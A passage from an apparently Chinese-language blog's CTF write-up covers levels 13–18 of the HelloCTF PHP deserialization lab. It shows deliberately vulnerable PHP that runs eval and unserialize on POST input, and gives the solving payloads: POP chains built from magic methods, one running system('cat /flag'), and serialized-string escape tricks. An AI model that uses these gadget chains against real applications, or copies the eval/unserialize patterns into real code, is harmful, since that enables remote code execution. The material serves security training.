/><h3 id="Level-13-toString"><a href="#Level-13-toString" class="headerlink" title="Level 13: __toString()"></a>Level 13: __toString()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 13 __toString()  --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m a string ~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试以字符串调用<code>$obj</code>即可利用<code>__toString()</code>返回flag</p><p>传递<code>o=echo $obj;</code>即可</p><br /><h3 id="Level-14-invoke"><a href="#Level-14-invoke" class="headerlink" title="Level 14: __invoke()"></a>Level 14: __invoke()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 14 : __invoke() --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。例如 $obj()。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="string">&#x27;get_flag&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试以函数调用<code>$obj</code>即可利用<code>__invoke()</code>返回flag</p><p>传递<code>o=$boj(&#39;get_flag&#39;);</code>即可</p><br /><h3 id="Level-15-POP链前置"><a href="#Level-15-POP链前置" class="headerlink" title="Level 15: POP链前置"></a>Level 15: POP链前置</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 15 : POP链初步 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">世界的本质其实就是套娃（x</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* FLAG in flag.php */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">destnation</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd-&gt;a-&gt;b-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是个套娃，目的是让<code>$this-&gt;cmd-&gt;a-&gt;b-&gt;c</code>的值为要执行的任意命令，为了调用<code>action()</code>，还需要套一层D类</p><p>构造链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$load</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d=<span class="keyword">new</span> <span class="title function_ invoke__">destnation</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a-&gt;b-&gt;c=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$load</span>);</span><br></pre></td></tr></table></figure><p><code>O:1:&quot;D&quot;:1:{s:1:&quot;d&quot;;O:10:&quot;destnation&quot;:1:{s:3:&quot;cmd&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;}}}}}</code></p><p>传入即可</p><br /><h3 id="Level-16-POP链构造"><a href="#Level-16-POP链构造" class="headerlink" title="Level 16: POP链构造"></a>Level 16: POP链构造</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 16 : zePOP--- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__wakeUp() 方法用于反序列化时自动调用。例如 unserialize()。</span></span><br><span class="line"><span class="comment">__invoke() 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。</span></span><br><span class="line"><span class="comment">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">试着把他们串起来吧ww</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INIT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is awake!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现利用顺序是<code>__wakeUp()</code>-&gt;<code>__toString</code>-&gt;<code>__invoke()</code>，最后需要包含<code>flag.php</code></p><p>构造链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new</span>=<span class="keyword">new</span> INIT;</span><br><span class="line"><span class="variable">$new</span>-&gt;name=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$new</span>-&gt;name-&gt;b=<span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$new</span>-&gt;name-&gt;b-&gt;a=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$new</span>);</span><br></pre></td></tr></table></figure><p><code>O:4:&quot;INIT&quot;:1:{s:4:&quot;name&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:8:&quot;flag.php&quot;;}}}</code>，传入即可</p><br /><h3 id="（特性）Level-17-字符串逃逸基础-无中生有"><a href="#（特性）Level-17-字符串逃逸基础-无中生有" class="headerlink" title="（特性）Level 17: 字符串逃逸基础-无中生有"></a>（特性）Level 17: 字符串逃逸基础-无中生有</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 17 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性_无中生有：当成员属性的实际数量符合序列化字符串中对应属性值时，似乎不会做任何检查？</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class A is NULL: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class B is a class with 3 properties: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="variable">$serliseString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After replace B with A,we unserialize it and dump :&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseString</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> A &amp;&amp; <span class="variable">$a</span>-&gt;helloctfcmd == <span class="string">&quot;get_flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s rule?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">Class A is <span class="literal">NULL</span>: <span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span></span><br><span class="line">Class B is a <span class="class"><span class="keyword">class</span> <span class="title">with</span> 3 <span class="title">properties</span>: &#x27;<span class="title">O</span>:1:&quot;<span class="title">B</span>&quot;:3:</span>&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Bc&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">After replace B with A,we unserialize it and dump :</span></span><br><span class="line"><span class="string">object(A)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;:protected]=&gt; string(3) &quot;CTF&quot; [&quot;c&quot;:&quot;A&quot;:private]=&gt; string(10) &quot;FLAG&#123;TEST&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure><p>由hint，当成员属性的实际数量符合序列化字符串中对应属性值时，不会做任何检查</p><p>更改B的属性后将名称替换为A即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$helloctfcmd</span>=<span class="string">&quot;get_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br></pre></td></tr></table></figure><p>得到<code>O:1:&quot;B&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code></p><p>修改传递<code>o=O:1:&quot;A&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code>即可</p><br /><h3 id="（特性）Level-18-字符串逃逸基础-尾部判定"><a href="#（特性）Level-18-字符串逃逸基础-尾部判定" class="headerlink" title="（特性）Level 18: 字符串逃逸基础-尾部判定"></a>（特性）Level 18: 字符串逃逸基础-尾部判定</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 18 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 &quot;;&#125;&quot; 作为字符串的结尾判定。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;GET_FLAG&quot;;&#125;FAKE_FLAG&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringDemo</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$change</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;change&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringFLAG</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$target</span>, <span class="variable">$change</span>, <span class="variable">$serliseStringDemo</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseStringFLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$FLAG</span> <span class="keyword">instanceof</span> FLAG &amp;&amp; <span class="variable">$FLAG</span>-&gt;key == <span class="string">&#x27;GET_FLAG&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">SerliseStringDemo:<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;&#x27;</span></span><br><span class="line">Change SOMETHING TO GET FLAGYour serliaze <span class="keyword">string</span> is O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;FAKE_FLAG<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">And Here is object(Demo)#1 (3) &#123; [&quot;</span>a<span class="string">&quot;]=&gt; string(5) &quot;</span>Hello<span class="string">&quot; [&quot;</span>b<span class="string">&quot;]=&gt; string(3) &quot;</span>CTF<span class="string">&quot; [&quot;</span>key<span class="string">&quot;]=&gt; string(20) &quot;</span>GET_FLAG<span class="string">&quot;;&#125;FAKE_FLAG&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>利用这个特性进行截断，只需要把对象名<code>&quot;Demo&quot;</code>替换为<code>&quot;FLAG&quot;</code>，字符数<code>20</code>替换为<code>8</code>即可</p><p>传递<code>target=O:4:&quot;Demo&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;}FAKE_FLAG&quot;;}</code></p><p><code>&amp;change=O:4:&quot;FLAG&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:8:&quot;GET_FLAG&quot;;}</code></p><br />]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
